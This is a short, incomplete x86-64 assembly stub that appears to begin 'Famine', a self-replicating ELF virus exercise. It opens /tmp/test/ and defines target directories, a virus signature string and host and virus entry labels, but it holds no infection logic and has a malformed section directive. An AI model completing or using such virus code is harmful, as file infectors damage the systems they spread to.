%include "famine.inc"

bits 64

section. text
default rel

global _start
;open first file found in /tmp/test


_start:
	mov rdi, test_1
	mov rsi, O_RDONLY
	call open

	


test_1 db "/tmp/test/",0
test_2 db "/tmp/test2/",0
signature db "Famine version coded by francis",0x0
host_entry dq _exit
virus_entry dq _start

_end
